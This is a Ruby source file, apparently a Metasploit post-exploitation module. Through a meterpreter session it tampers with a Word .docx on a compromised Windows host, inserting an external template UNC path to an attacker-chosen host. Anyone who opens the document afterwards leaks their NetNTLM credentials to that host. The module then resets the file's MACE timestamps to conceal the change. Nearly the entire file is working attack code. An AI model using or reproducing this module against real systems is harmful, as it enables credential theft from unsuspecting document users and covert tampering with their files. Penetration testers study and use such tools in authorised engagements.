##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://Metasploit.com/projects/Framework/
##

require 'msf/core'
require 'msf/core/post/file'
require 'zip/zip' #for extracting files
require 'rex/zip' #for creating files

class Metasploit3 < Msf::Post

	include Msf::Post::File
	include Msf::Post::Windows::Priv

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft Word UNC Path Injector',
			'Description'    => %q{
					This module modifies a remote .docx file that will, upon opening, submit 
				stored netNTLM credentials to a remote host. Verified to work with Microsoft 
				Word 2003, 2007 and 2010 as of January 2013. In order to get the hashes 
				the auxiliary/server/capture/smb module can be used.
			},
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'URL', 'http://jedicorp.com/?p=534' ]
				],
			'Platform'	=> ['win'],
			'SessionTypes'	=> ['meterpreter'],
			'Author'        =>
				[
					'SphaZ <cyberphaz[at]gmail.com>'
				]
		))
		
		register_options(
			[
					OptAddress.new('LHOST',[true, 'Server IP or hostname that the .docx document points to']),
					OptString.new('FILE', [true, 'Remote file to inject UNC path into. ']),
					OptPath.new('BACKUPDIR', [true, 'Directory to put original documents for backup']),
					OptBool.new('BACKUP', [true, 'Make local backup of remote file.', 'True']),
			], self.class)
	end

	#Store MACE values so we can set them later again.
	def get_mace
		begin
			mace = session.priv.fs.get_file_mace(datastore['FILE'])
			vprint_status("Got file MACE attributes!")
		rescue => e
			print_error("Error getting the original MACE values of #{datastore['FILE']}, not a fatal error but timestamps will be different!")
			print e.message
		end
		return mace		
	end

	#using Tempfile does not work, because if Ruby garbage collects they are gone before we can use it, so we do it manually	
	def write_tmp(filedata)
		tmp = File.join(Dir.tmpdir, Time.now.to_i.to_s + rand(5555).to_s)
		File.open(tmp, 'w') {|f| f.write(filedata) }
		return tmp
	end


	#We make a backup of the original and return the full path and filename when done.
	def make_backup(zipfile)
		if not File.directory?(datastore['BACKUPDIR'])
			print_error("Backup directory #{datastore['BACKUPDIR']} does not exist.")
			return nil
		end
		
		#basename wont work, so we do it the regex way
		if session.platform.include?'win'
			tempname = datastore['FILE'].split("\\").last
		else
			tempname = datastore['FILE'].split("/").last
		end

		dst_filename = File.join(datastore['BACKUPDIR'], tempname)    
		begin
			File.open(dst_filename,'wb') {|f| f.write(zipfile)}
			return dst_filename
		rescue
			print_error("Error saving backup file to #{datastore['BACKUPDIR']}.")
			return nil			
		end
	end

	#here we unzip into memory, inject our UNC path, store it in a temp file and 
	#return the modified zipfile name for upload
	def manipulate_file(zipfile)
		ref = "<w:attachedTemplate r:id=\"rId1\"/>"
		
		rels_file_data = ""
		rels_file_data << "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>"
		rels_file_data << "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">"
		rels_file_data << "<Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/"
		rels_file_data << "attachedTemplate\" Target=\"file://\\\\#{datastore['LHOST']}\\normal.dot\" TargetMode=\"External\"/></Relationships>"
	
		zip_data = unzip_docx(zipfile)
		if zip_data.nil?
			return nil
		end
		
		#file to check for reference file we need
		file_content = zip_data["word/settings.xml"]
		if file_content.nil?
			print_error("Bad \"word/settings.xml\" file, check if it is a valid .docx.")
			return nil
		end

		#if we can find the reference to our inject file, we don't need to add it and can just inject our unc path.
		if not file_content.index("w:attachedTemplate r:id=\"rId1\"").nil?
			vprint_status("Reference to rels file already exists in settings file, we dont need to add it :)")
			zip_data["word/_rels/settings.xml.rels"] = rels_file_data
			return zip_docx(zip_data)
		else
			#now insert the reference to the file that will enable our malicious entry
			insert_one = file_content.index("<w:defaultTabStop")

			if insert_one.nil?
				insert_two = file_content.index("<w:hyphenationZone") # 2nd choice
				if not insert_two.nil?
					vprint_status("HypenationZone found, we use this for insertion.")
					file_content.insert(insert_two, ref )
				end
			else
				vprint_status("DefaultTabStop found, we use this for insertion.")
				file_content.insert(insert_one, ref )
			end

			if insert_one.nil? && insert_two.nil?
				print_error("Cannot find insert point for reference into settings.xml")
				return nil
			end

			#update the files that contain the injection and reference
			zip_data["word/settings.xml"] = file_content
			zip_data["word/_rels/settings.xml.rels"] = rels_file_data
			return zip_docx(zip_data)
		end
	end

	#RubyZip sometimes corrupts the document when manipulating inside a 
	#compressed document, so we extract it with Zip::ZipFile into memory
	def unzip_docx(zipfile)
		vprint_status("Extracting #{datastore['FILE']} into memory.")
		zip_data = Hash.new
		begin
			Zip::ZipFile.open(zipfile)  do |filezip|
				filezip.each do |entry|
					zip_data[entry.name] = filezip.read(entry)
				end
			end
		rescue Zip::ZipError => e
			print_error("Error extracting #{datastore['FILE']} please verify it is a valid .docx document.")
			return nil
		end
		return zip_data
	end

	#making the actual docx we write to a temp file, 
	#because upload_file needs a file as source
	def zip_docx(zip_data)
		docx = Rex::Zip::Archive.new
		zip_data.each_pair do |k,v|
			docx.add_file(k,v)
		end
		
		tmp_file_name = write_tmp(docx.pack)
		return tmp_file_name
	end

	#We try put the mace values back to that of the original file
	def set_mace(mace)
		if not mace.nil?
			vprint_status("Setting MACE value of #{datastore['FILE']} set to that of the original file.")
			begin
				session.priv.fs.set_file_mace(datastore['FILE'], mace["Modified"], mace["Accessed"], mace["Created"], mace["Entry Modified"])
			rescue
				print_error("Error setting the original MACE values of #{datastore['FILE']}, not a fatal error but timestamps will be different!")
			end
		end
	end

	def run
		zipfile = ""
		backup_filename = ""

		#sadly OptPath does not work, so we check manually if it exists
		if not session.fs.file.exists?(datastore['FILE'])
			print_error("Remote file does not exist!")
			return
		end
		
		#get mace values so we can put them back after uploading. We do this first, so we have the original
		#accessed time too.
		file_mace = get_mace

		#download the remote file
		file_data = session.fs.file.new("#{datastore['FILE']}", 'rb')
		begin
			print_status("Downloading remote file #{datastore['FILE']}.")
			until file_data.eof?
				data = file_data.read
				zipfile << data if not data.nil?
			end
			print_status("Remote file #{datastore['FILE']} downloaded.")
			file_data.close
		rescue EOFError
			print_error("Error reading remote file.")
			return
		end
		
		
		#Create local backup of remote file if wanted else a temp file
		#Either way we need a local file to use because you cannot extract a zipfile into memory.
		if datastore['BACKUP']
			backup_filename = make_backup(zipfile)
			if backup_filename.nil?
				return 
			else
				print_status("Local backup of original file stored at #{backup_filename}.")
				tmp_zipfile = backup_filename
			end
		else #no backup, so we use a temporary file instead
				print_warning("Not storing a local backup of original file!")
				tmp_zipfile = write_tmp(zipfile)		
		end
		
		#Unzip, insert our UNC path, zip and return the filename of the injected temp file for upload
		modified_zip_name = manipulate_file(tmp_zipfile)
		if modified_zip_name.nil?
			return	
		end

		#upload the injected file
		begin
			session.fs.file.upload_file(datastore['FILE'], modified_zip_name)
			print_status("Uploaded injected file to remote #{datastore['FILE']}...")
		rescue => e
			print_error("Error uploading file to #{datastore['FILE']}: #{e.class} #{e}")
			return
		end
		
		#cleanup of local temp files
		FileUtils.rm(modified_zip_name)
		if not datastore['BACKUP']
			FileUtils.rm(tmp_zipfile)
		end

		#set mace values back to that of original
		set_mace(file_mace)

		#Store information in note database so its obvious what we changed, were we stored the backup file (if we did)
		note_string ="Remote file #{datastore['FILE']} contains UNC path to #{datastore['LHOST']}. "
		if datastore['BACKUP']
			note_string += " Local backup of file at #{backup_filename}."
		end

		report_note(:host => session.session_host, 
		:type => "host.word_unc_injector.changedfiles",
		:data => {
			:session_num => session.sid,
			:stype => session.type,
			:desc => session.info,
			:platform => session.platform,
			:via_payload => session.via_payload,
			:via_exploit => session.via_exploit,
			:created_at => Time.now.utc,
			:files_changed => note_string
			}
		)

		print_good("Done! File #{datastore['FILE']} succesfully injected to point to #{datastore['LHOST']}")
	end
end
